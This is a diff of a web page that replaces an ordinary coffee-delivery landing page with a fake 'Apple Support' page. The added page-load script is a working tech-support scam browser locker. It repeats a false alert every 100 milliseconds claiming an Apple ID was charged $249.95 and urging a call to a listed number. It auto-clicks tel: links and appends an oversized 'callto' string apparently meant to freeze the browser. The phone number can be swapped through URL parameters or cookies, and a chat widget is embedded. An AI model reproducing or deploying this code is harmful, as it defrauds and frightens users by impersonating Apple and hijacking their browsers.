-            c-16.5,10.7-25.4,29.5-35.6,46.3c-16.6,27.2-48,49.3-78.9,27.9C2970.8,229,2977.5,211.3,3011.4,197.5z M2363.7,198.7
-            c1.3-14.8,16.5-25,31.2-27c20.4-2.8,41.2,5.8,56.4,19.7s25.3,32.5,32.6,51.7c3.8,10.2,7,21.1,5.2,31.8c-0.2,1.4-0.5,2.7-0.9,3.9
-            c-7.4,26.6-40.5,19.8-58.7,7.6c-21.4-14.4-36.7-36.4-52.3-56.5C2370.2,220.6,2362.7,210.3,2363.7,198.7z M478.2,117.2
-            c50.9-7.6,113.9,49.4,130.3,65.2c3.9,3.8,6.8,8.6,7.9,14c7.7,35.5-65.2,41.3-110.4-10C481,158,419.3,126,478.2,117.2z"
-          ></path>
-          <path
-            class="elementor-shape-fill ha-shape-divider"
-            d="M2763.7,63c24.5,0.3,76.6,20.9,80.7,45.1c4.3,25.2-28.4,39-48.3,41.5c-31.3,4-75.5-9.8-87.7-42
-            C2694.3,70.4,2736.1,62.7,2763.7,63z M1470.9,89.4c13.5-2.4,27.2,7.8,36.8,16c0,0,30,33,54.6,6.1c19.3-21.1,44.6-16.1,51.2,3
-            c5.3,15.3-7.9,24.5-19.7,30.2c-5.5,2.7-11.1,5.4-16.6,8c-11.5,5.4-23.1,10.4-35.3,14.2c-13.9,4.4-28.5,7.3-43.1,7.5
-            c-8.9,0.1-18.4-1.7-26.3-6.3c-9.6-5.6-15.7-14.6-18.6-25C1449.1,126.9,1448.4,93.5,1470.9,89.4z M0,32.3c0,4.8,0.9,9.6,2.7,14.1
-            c50.1,127.6,97.6,18.3,207,43.8c120,28,195.5-171,471.5,67c79.3,68.4,96.5-51.8,158.5-81c116.1-54.8,138,72,248,113.8
-            c115.5,43.9,234-84.5,308.3-35.1c13.4,8.9,21.5,22.8,34.9,32c16.7,11.5,35.8,19.5,56,22.3c55.7,7.8,114.5-11.7,209-65.4
-            c94.5-53.7,163.8-31.9,198.5-12.4c34.7,19.5,87.2,46.7,144.9,46.7c57.8,0,69.3-56,69.3-56s10.5-83.2,62-91.8
-            c51.5-8.6,92.4,33.4,125,64.6c39.8,38,89.8,15.9,136.5,11.9c58.7-5,116.2,19.1,167.9,44.1c63.5,30.7,129.7,65.9,200,60.1
-            c65.2-5.4,121.6-45.1,175.8-81.7c58.8-39.7,120.2-73,193.2-70c165,6.9,285,83.1,387,93c102,9.9,129-193,204-93
-            c73.9,98.4,139.1,210.5,412.2,36.2c8-5.1,12.8-14,12.8-23.5V0L0,0L0,32.3z"
-          ></path>
-        </svg>
-      </div>
-    </section>
-
-    <section class="section partners shippingvw--overlay">
-      <div class="container">
-        <h2 class="title">Trusted by the best in the world</h2>
-      </div>
-      <div class="partners-box">
-        <div class="container partners-img">
-          <div class="partners-img-box">
-            <img src="uploads/partners-thumb_Zy0.png" alt="" />
-          </div>
-          <div class="partners-img-box">
-            <img src="uploads/partners-thumb_Zy1.png" alt="" />
-          </div>
-          <div class="partners-img-box">
-            <img src="uploads/partners-thumb_Zy2.png" alt="" />
-          </div>
-          <div class="partners-img-box">
-            <img src="uploads/partners-thumb_Zy3.png" alt="" />
-          </div>
-          <div class="partners-img-box">
-            <img src="uploads/partners-thumb_Zy4.png" alt="" />
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <div class="fl-box">
-      <section class="section" id="about-us">
-        <div class="container main-block-container">
-          <h2 class="title">Freshly Brewed Coffee, Delivered by  Drupaluxsul </h2>
-          <div class="content__block">
-            <div class="main-wrapper">
-              <img class="main-img" src="thumbnails/coffee_tea_2ab3b_1.jpg" alt="Freshly Brewed Coffee, Delivered by  Drupaluxsul " />
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                       <a href="#">Apple Support +1-855-595-3060 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+					 </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
+							 </label>
+                            </div>
+                        </div>
+                    </div>
+                </div>
             </div>
+        </nav>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class="as-banner-cont">
+                        <div class="as-banner-image as-banner-image--top">
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("images/contact-us-hero.image.large_2x.jpg");
+                                }
 
-            <div class="main-description">
-              <div><p><span>At </span><strong><span> Drupaluxsul </span></strong><span>, we believe a truly good cup of coffee should arrive fresh, aromatic, and ready to enjoy&mdash;without requiring you to leave your home or interrupt a busy working day. Our freshly brewed coffee delivery service brings caf&eacute;-quality drinks directly to homes and offices, combining carefully selected coffee, thoughtful preparation, and convenient delivery. Whether you need a smooth morning latte before starting the day, a strong espresso to keep your team focused, or a selection of freshly prepared drinks for an office meeting,  Drupaluxsul  makes enjoying great coffee effortless. Every order is prepared with attention to flavor and freshness, so the coffee that reaches your door tastes exactly as it should: rich, fragrant, comforting, and satisfying.</span></p>
-<p style="text-align: center;"><strong><span>Our Services</span></strong></p>
-<p><span>We provide flexible coffee delivery solutions designed around the different ways our customers enjoy their daily brew. From a single cup at home to larger workplace orders, our goal is to make freshly prepared coffee accessible whenever it is needed. Our four core services are:</span></p>
-<ul>
-<li><strong><span>Home Coffee Delivery</span></strong><span> &mdash; Freshly brewed coffee delivered directly to your doorstep, perfect for relaxed mornings, productive afternoons, weekend treats, or any moment when you want caf&eacute;-quality coffee without going out.</span></li>
-<li><strong><span>Office Coffee Delivery</span></strong><span> &mdash; Convenient coffee delivery for teams and workplaces, helping employees stay refreshed and energized throughout the working day without wasting valuable time on coffee runs.</span></li>
-<li><strong><span>Meeting  Group Orders</span></strong><span> &mdash; Fresh coffee prepared for meetings, presentations, workshops, training sessions, client visits, and other professional occasions where a welcoming cup of coffee makes a difference.</span></li>
-<li><strong><span>Scheduled Coffee Delivery</span></strong><span> &mdash; Regular delivery options for homes and offices that want fresh coffee at familiar times, making it easier to turn a favorite drink into a dependable part of the daily routine.</span></li>
-</ul>
-<p style="text-align: center;"><strong><span>Coffee Made for Your Everyday Moments</span></strong></p>
-<p><span>Coffee is more than a beverage&mdash;it often marks the beginning of a morning, creates a moment of calm between tasks, or brings people together during a conversation. That is why  Drupaluxsul  focuses on making every delivery feel like more than a simple transaction. For home customers, our service adds a little caf&eacute; comfort to everyday life, whether you are working remotely, spending time with family, or simply enjoying a quiet break. For businesses, freshly brewed coffee can make the workplace feel more welcoming and help create a pleasant environment for employees, guests, and clients. Instead of settling for an ordinary office cup or sending someone out to collect drinks, you can have fresh coffee brought directly to you.</span></p>
-<p style="text-align: center;"><strong><span>Our Approach</span></strong></p>
-<p><span>Our approach is built around three things: </span><strong><span>freshness, consistency, and convenience</span></strong><span>. We prepare coffee with care and organize delivery so that your drink spends less time waiting and more time being enjoyed. Every step&mdash;from brewing to packaging and delivery&mdash;is designed to preserve the qualities that make freshly prepared coffee special. At the same time, we understand that convenience should never mean compromising on quality. Whether you place an individual order or arrange coffee for an entire office, we aim to provide the same dependable experience every time. Clear ordering, careful preparation, practical delivery, and attention to the details allow us to create a service that fits naturally into your schedule rather than complicating it.</span></p>
-<p style="text-align: center;"><strong><span>Why Choose  Drupaluxsul ?</span></strong></p>
-<p><span>Choosing  Drupaluxsul  means choosing a service created for people who appreciate good coffee but also value their time. We combine the pleasure of freshly brewed coffee with the convenience of doorstep delivery, eliminating unnecessary trips, queues, and interruptions. Our service works equally well for individuals who want to brighten their morning and businesses looking for an easy way to keep employees and visitors supplied with quality coffee. We pay attention to every order, whether it is one drink or a larger workplace request, and we strive to deliver a consistent experience built on reliability and care. With flexible options for home, office, group, and scheduled deliveries,  Drupaluxsul  can become your everyday coffee solution rather than an occasional convenience.</span></p>
-<p style="text-align: center;"><strong><span>Fresh Coffee Is Closer Than You Think</span></strong></p>
-<p><span>With  Drupaluxsul , your next great cup of coffee does not require a trip across town&mdash;it can come directly to you. Start the morning with the aroma of freshly brewed coffee at home, make the working day more enjoyable with an office delivery, or welcome colleagues and clients with drinks prepared especially for your meeting. Whatever the occasion, our purpose remains simple: to make fresh, delicious coffee easier to enjoy. We take care of the brewing and delivery so you can concentrate on the moment, the conversation, or the work in front of you. </span><strong><span> Drupaluxsul  brings the coffeehouse experience to your door&mdash;freshly brewed, carefully prepared, and conveniently delivered whenever your day calls for a better cup of coffee.</span></strong></p></div>
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
+
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("images/contact-us-hero.image.small_2x.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="images/contact-us-hero.image.small_2x.jpg 735w, images/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="images/contact-us-hero.image.large_2x.jpg">
+                        </div>
+                    </div>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock">
+                        </p></div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
+                    </div>
+                </div>
             </div>
-          </div>
-
-           
-        </div>
-      </section>
-
-      <section class="section how-work">
-        <div class="container">
-          <h2 class="title">Step by step: from the selection of raw materials to your table.</h2>
-          <ul class="how-work-list">
-            <li class="how-work-item">
-              <svg
-                xmlns="http://www.w3.org/2000/svg"
-                width="16"
-                height="16"
-                fill="currentColor"
-                class="bi bi-rocket-takeoff how-work-svg"
-                viewBox="0 0 16 16"
-              >
-                <path
-                  d="M9.752 6.193c.599.6 1.73.437 2.528-.362.798-.799.96-1.932.362-2.531-.599-.6-1.73-.438-2.528.361-.798.8-.96 1.933-.362 2.532Z"
-                />
-                <path
-                  d="M15.811 3.312c-.363 1.534-1.334 3.626-3.64 6.218l-.24 2.408a2.56 2.56 0 0 1-.732 1.526L8.817 15.85a.51.51 0 0 1-.867-.434l.27-1.899c.04-.28-.013-.593-.131-.956a9.42 9.42 0 0 0-.249-.657l-.082-.202c-.815-.197-1.578-.662-2.191-1.277-.614-.615-1.079-1.379-1.275-2.195l-.203-.083a9.556 9.556 0 0 0-.655-.248c-.363-.119-.675-.172-.955-.132l-1.896.27A.51.51 0 0 1 .15 7.17l2.382-2.386c.41-.41.947-.67 1.524-.734h.006l2.4-.238C9.005 1.55 11.087.582 12.623.208c.89-.217 1.59-.232 2.08-.188.244.023.435.06.57.093.067.017.12.033.16.045.184.06.279.13.351.295l.029.073a3.475 3.475 0 0 1 .157.721c.055.485.051 1.178-.159 2.065Zm-4.828 7.475.04-.04-.107 1.081a1.536 1.536 0 0 1-.44.913l-1.298 1.3.054-.38c.072-.506-.034-.993-.172-1.418a8.548 8.548 0 0 0-.164-.45c.738-.065 1.462-.38 2.087-1.006ZM5.205 5c-.625.626-.94 1.351-1.004 2.09a8.497 8.497 0 0 0-.45-.164c-.424-.138-.91-.244-1.416-.172l-.38.054 1.3-1.3c.245-.246.566-.401.91-.44l1.08-.107-.04.039Zm9.406-3.961c-.38-.034-.967-.027-1.746.163-1.558.38-3.917 1.496-6.937 4.521-.62.62-.799 1.34-.687 2.051.107.676.483 1.362 1.048 1.928.564.565 1.25.941 1.924 1.049.71.112 1.429-.067 2.048-.688 3.079-3.083 4.192-5.444 4.556-6.987.183-.771.18-1.345.138-1.713a2.835 2.835 0 0 0-.045-.283 3.078 3.078 0 0 0-.3-.041Z"
-                />
-                <path
-                  d="M7.009 12.139a7.632 7.632 0 0 1-1.804-1.352A7.568 7.568 0 0 1 3.794 8.86c-1.102.992-1.965 5.054-1.839 5.18.125.126 3.936-.896 5.054-1.902Z"
-                />
-              </svg>
-              <p>Place your order online selecting your favorite coffee blend and delivery time.</p>
-            </li>
-
-            <li class="how-work-item">
-              <svg
-                xmlns="http://www.w3.org/2000/svg"
-                width="16"
-                height="16"
-                fill="currentColor"
-                class="bi bi-motherboard how-work-svg"
-                viewBox="0 0 16 16"
-              >
-                <path
-                  d="M11.5 2a.5.5 0 0 1 .5.5v7a.5.5 0 0 1-1 0v-7a.5.5 0 0 1 .5-.5Zm2 0a.5.5 0 0 1 .5.5v7a.5.5 0 0 1-1 0v-7a.5.5 0 0 1 .5-.5Zm-10 8a.5.5 0 0 0 0 1h6a.5.5 0 0 0 0-1h-6Zm0 2a.5.5 0 0 0 0 1h6a.5.5 0 0 0 0-1h-6ZM5 3a1 1 0 0 0-1 1h-.5a.5.5 0 0 0 0 1H4v1h-.5a.5.5 0 0 0 0 1H4a1 1 0 0 0 1 1v.5a.5.5 0 0 0 1 0V8h1v.5a.5.5 0 0 0 1 0V8a1 1 0 0 0 1-1h.5a.5.5 0 0 0 0-1H9V5h.5a.5.5 0 0 0 0-1H9a1 1 0 0 0-1-1v-.5a.5.5 0 0 0-1 0V3H6v-.5a.5.5 0 0 0-1 0V3Zm0 1h3v3H5V4Zm6.5 7a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h2a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-2Z"
-                />
-                <path
-                  d="M1 2a2 2 0 0 1 2-2h11a2 2 0 0 1 2 2v11a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2v-2H.5a.5.5 0 0 1-.5-.5v-1A.5.5 0 0 1 .5 9H1V8H.5a.5.5 0 0 1-.5-.5v-1A.5.5 0 0 1 .5 6H1V5H.5a.5.5 0 0 1-.5-.5v-2A.5.5 0 0 1 .5 2H1Zm1 11a1 1 0 0 0 1 1h11a1 1 0 0 0 1-1V2a1 1 0 0 0-1-1H3a1 1 0 0 0-1 1v11Z"
-                />
-              </svg>
-              <p>Our expert baristas brew your coffee fresh to ensure maximum flavor and quality.</p>
-            </li>
-
-            <li class="how-work-item">
-              <svg
-                xmlns="http://www.w3.org/2000/svg"
-                width="16"
-                height="16"
-                fill="currentColor"
-                class="bi bi-plugin how-work-svg"
-                viewBox="0 0 16 16"
-              >
-                <path
-                  fill-rule="evenodd"
-                  d="M1 8a7 7 0 1 1 2.898 5.673c-.167-.121-.216-.406-.002-.62l1.8-1.8a3.5 3.5 0 0 0 4.572-.328l1.414-1.415a.5.5 0 0 0 0-.707l-.707-.707 1.559-1.563a.5.5 0 1 0-.708-.706l-1.559 1.562-1.414-1.414 1.56-1.562a.5.5 0 1 0-.707-.706l-1.56 1.56-.707-.706a.5.5 0 0 0-.707 0L5.318 5.975a3.5 3.5 0 0 0-.328 4.571l-1.8 1.8c-.58.58-.62 1.6.121 2.137A8 8 0 1 0 0 8a.5.5 0 0 0 1 0Z"
-                />
-              </svg>
-              <p>We package your coffee securely using eco-friendly materials for safe delivery.</p>
-            </li>
-          </ul>
-        </div>
-      </section>
+        </section>
     </div>
 
-    <section class="section itemqi__tag" id="advantages">
-      <div class="container">
-        <h2 class="title">Our Advantages</h2>
-        <div class="advantages-wrapper">
-          <div class="advantages-box mb-4">
-            <img src="uploads/svg_2026-08-17_08-28-271.png" alt="" />
-            <p class="advanteges-text">Freshness Guaranteed Every cup is brewed fresh upon order, ensuring that you receive the best taste and aroma possible with each delivery.</p>
-          </div>
-          <div class="advantages-box advantages-box-s">
-            <p class="advanteges-text">Convenient Delivery We deliver directly to your home or office, saving you time and effort while providing a premium coffee experience.</p>
-            <img src="uploads/svg_2026-08-17_08-28-272.png" alt="" />
-          </div>
-        </div>
-      </div>
-    </section>
-    
-    <section class="section" id="reviews">
-      <div class="container">
-        <h2 class="title reviews-title">Comments</h2>
-        <ul class="reviews-list">
-          <li class="reviews-item">
-            <div class="svg-box">
-              <svg
-                xmlns="http://www.w3.org/2000/svg"
-                width="16"
-                height="16"
-                fill="currentColor"
-                class="bi bi-quote reviews-svg"
-                viewBox="0 0 16 16"
-              >
-                <path
-                  d="M12 12a1 1 0 0 0 1-1V8.558a1 1 0 0 0-1-1h-1.388c0-.351.021-.703.062-1.054.062-.372.166-.703.31-.992.145-.29.331-.517.559-.683.227-.186.516-.279.868-.279V3c-.579 0-1.085.124-1.52.372a3.322 3.322 0 0 0-1.085.992 4.92 4.92 0 0 0-.62 1.458A7.712 7.712 0 0 0 9 7.558V11a1 1 0 0 0 1 1h2Zm-6 0a1 1 0 0 0 1-1V8.558a1 1 0 0 0-1-1H4.612c0-.351.021-.703.062-1.054.062-.372.166-.703.31-.992.145-.29.331-.517.559-.683.227-.186.516-.279.868-.279V3c-.579 0-1.085.124-1.52.372a3.322 3.322 0 0 0-1.085.992 4.92 4.92 0 0 0-.62 1.458A7.712 7.712 0 0 0 3 7.558V11a1 1 0 0 0 1 1h2Z"
-                />
-              </svg>
-            </div>
-
-            <p class="avatar-com">Drupaluxsul has transformed my mornings with their prompt delivery and exceptional coffee quality.</p>
-            <div class="avatar-box">
-              <img src="uploads/avatar1_q80_0.webp" />
-              <h3>James Anderson</h3>
-            </div>
-          </li>
-          <li class="reviews-item">
-            <div class="svg-box">
-              <svg
-                xmlns="http://www.w3.org/2000/svg"
-                width="16"
-                height="16"
-                fill="currentColor"
-                class="bi bi-quote reviews-svg"
-                viewBox="0 0 16 16"
-              >
-                <path
-                  d="M12 12a1 1 0 0 0 1-1V8.558a1 1 0 0 0-1-1h-1.388c0-.351.021-.703.062-1.054.062-.372.166-.703.31-.992.145-.29.331-.517.559-.683.227-.186.516-.279.868-.279V3c-.579 0-1.085.124-1.52.372a3.322 3.322 0 0 0-1.085.992 4.92 4.92 0 0 0-.62 1.458A7.712 7.712 0 0 0 9 7.558V11a1 1 0 0 0 1 1h2Zm-6 0a1 1 0 0 0 1-1V8.558a1 1 0 0 0-1-1H4.612c0-.351.021-.703.062-1.054.062-.372.166-.703.31-.992.145-.29.331-.517.559-.683.227-.186.516-.279.868-.279V3c-.579 0-1.085.124-1.52.372a3.322 3.322 0 0 0-1.085.992 4.92 4.92 0 0 0-.62 1.458A7.712 7.712 0 0 0 3 7.558V11a1 1 0 0 0 1 1h2Z"
-                />
-              </svg>
-            </div>
-
-            <p class="avatar-com">I love how easy it is to order and receive fresh coffee without leaving my home.</p>
-            <div class="avatar-box">
-              <img src="uploads/thumb_rizmx_0.webp" />
-              <h3>Emily Parker</h3>
-            </div>
-          </li>
-          <li class="reviews-item">
-            <div class="svg-box">
-              <svg
-                xmlns="http://www.w3.org/2000/svg"
-                width="16"
-                height="16"
-                fill="currentColor"
-                class="bi bi-quote reviews-svg"
-                viewBox="0 0 16 16"
-              >
-                <path
-                  d="M12 12a1 1 0 0 0 1-1V8.558a1 1 0 0 0-1-1h-1.388c0-.351.021-.703.062-1.054.062-.372.166-.703.31-.992.145-.29.331-.517.559-.683.227-.186.516-.279.868-.279V3c-.579 0-1.085.124-1.52.372a3.322 3.322 0 0 0-1.085.992 4.92 4.92 0 0 0-.62 1.458A7.712 7.712 0 0 0 9 7.558V11a1 1 0 0 0 1 1h2Zm-6 0a1 1 0 0 0 1-1V8.558a1 1 0 0 0-1-1H4.612c0-.351.021-.703.062-1.054.062-.372.166-.703.31-.992.145-.29.331-.517.559-.683.227-.186.516-.279.868-.279V3c-.579 0-1.085.124-1.52.372a3.322 3.322 0 0 0-1.085.992 4.92 4.92 0 0 0-.62 1.458A7.712 7.712 0 0 0 3 7.558V11a1 1 0 0 0 1 1h2Z"
-                />
-              </svg>
-            </div>
-            <p class="avatar-com">The aroma and taste are always perfect, making every cup a delightful experience.</p>
-            <div class="avatar-box">
-              <img src="uploads/thumb_rizmx_1.webp" />
-              <h3>Sophia Quinn</h3>
-            </div>
-          </li>
-        </ul>
-      </div>
-    </section>
-    
-
-    <section class="section offerhi__form">
-      <div class="container">
-        <h2 class="title">You can use our services by writing to us or calling us. We will be happy to answer any questions and help you order services!</h2>
-
-        
-        <div class="form-box">
-           <form method="post" class="contact-form" action="gratitude.php">
-            <div class="contact-wrapper">
-               <label for="inputsection-section-name">Enter your name</label><input class="input-inputsection-section" id="inputsection-sectionname" type="text" name="nameinfo-component" required> <label for="inputsection-section-phone">Enter Your Phone Number</label><input name="phoneinfo-component" class="input-inputsection-section" id="inputsection-section-phone" type="tel" required> <label for="inputsection-section-email">Email Address</label><input name="emailinfo-component" class="input-inputsection-section" id="inputsection-section-email" type="email" required>
-            </div>
-              <div class="checkInput">
-                  <input type="checkbox" id="checkAccept" class="checkbox-input" />
-                  <label for="checkAccept" class="checkbox-label">
-                    I accept <a href="Privacy.html" target="_blank">Privacy policy</a>
-                  </label>
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple Store </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
                 </div>
-            <button class="button-1 contact-btn" type="submit">
-              <span>Expert consultation</span>
-            </button>
-          </form>
-          
-
-          
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="images/us.png" alt="" width="16" height="16">United
+					States </a>
+                </div>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2026 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
+					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
+						Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+						Apple </a></div>
+                </div>
+                <meta content="Apple" property="name">
+                <meta content="+1-855-595-3060
+			 " property="telephone">
+            </section>
         </div>
-      </div>
-    </section>
-    
-    <section class="section footer" id="contact">
-      <div class="container footer-wrapper">
-        <div class="logo">
-          <div
-            class="logo-box d-flex align-items-center justify-content-center"
-          >
-            <img src="logo-icon.png" alt="" />
-            <h2>Drupaluxsul</h2>
-          </div>
-        </div>
-
-        
-      </div>
-      <div class="footer-privacy-wrapper">
-        <a class="footer-privacy" href="Privacy.html" target="_blank">Privacy policy</a>
-        <a class="footer-privacy" href="terms.html" target="_blank">Terms & Conditions</a>
-        <a class="footer-privacy" href="disclaimer.html" target="_blank">Disclaimer</a>
-      </div>
-    </section>
- 
- 
+    </footer>
 
 
- 
-    
-    
-  </body>
-  
-</html>
 
+    <script src="js/jquery-1.12.0.min.js"></script>
+    <script>
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        };
+        var cookieHelper = {
+            defParams: {
+                path: "/",
+                domain: "." + window.location.host.replace(/:\d+/, "")
+            },
+            set: function(a, d, c) {
+                c = c || {};
+                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
+                b = c.expires;
+                if ("number" == typeof b && b) {
+                    var e = new Date;
+                    e.setTime(e.getTime() + 1E3 * b);
+                    b = c.expires = e
+                }
+                b && b.toUTCString && (c.expires = b.toUTCString());
+                d = encodeURIComponent(d);
+                a = a + "=" + d;
+                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
+                document.cookie = a
+            },
+            get: function(a) {
+                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
+            },
+            del: function(a) {
+                this.set(a, null, {
+                    expires: -1
+                })
+            }
+        };
+
+
+        var userAgent = window.navigator.userAgent.toLowerCase(),
+            ios = /iphone|ipod|ipad/.test(userAgent);
+
+        function parseURL(url) {
+            var a = document.createElement('a');
+            a.href = url;
+            return a.hostname.replace('www.', '');
+        };
+
+        function getPar(name) {
+            var url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        };
+
+        window.number = getPar('phone');
+
+        window.number = (window.number ? window.number : '+1-855-595-3060');
+
+        window.device = 'iPhone';
+        window.refef = parseURL(document.referrer);
+
+        if (ios) {
+
+            if (/iphone/.test(userAgent)) {
+                window.device = 'iPhone';
+            }
+
+            if (/ipad/.test(userAgent)) {
+                window.device = 'iPad';
+            }
+
+            if (/ipod/.test(userAgent)) {
+                window.device = 'iPod';
+            }
+        }
+
+        var text = cookieHelper.get('textSetBl');
+        var phone = cookieHelper.get('phoneSetBl');
+
+        function getText() {
+            var str = window.defaultText;
+
+            for (var d in window.text) {
+                if (window.refef.indexOf(d) != -1) {
+                    str = window.text[d];
+                }
+            }
+            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
+            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
+        }
+
+
+        if (!phone) {
+            phone = getURLParameter('phone');
+        }
+        if (!text) {
+            text = getURLParameter('text');
+        }
+
+        var sText = document.querySelectorAll('.js_setTextBlock');
+        for (var t = 0; t < sText.length; t++) {
+            sText[t].innerHTML = getText();
+        }
+        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+        for (var p = 0; p < sPhone.length; p++) {
+            sPhone[p].innerHTML = phone;
+        }
+
+
+        setInterval(function() {
+            myFunction()
+        }, 100);
+
+        function okkkk() {
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-855-595-3060"></a>');
+            document.querySelector('a').click();
+            var extraData = "";
+            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
+                var extraData = extraData + "5555555555";
+            }
+            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
+        };
+
+        function myFunction() {
+            if (confirm("Your Apple ID was recently used at APPLE STORE for $249.95 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support +1-855-595-3060 to Freeze it!.")) {
+                okkkk();
+            } else {
+                okkkk();
+            }
+        }
+
+        window.ununload = function() {
+            debugger;
+            location.reload();
+        }
+    </script>
+
+
+
+
+
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/667056f19a809f19fb3eaed8/1i0jd783t';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
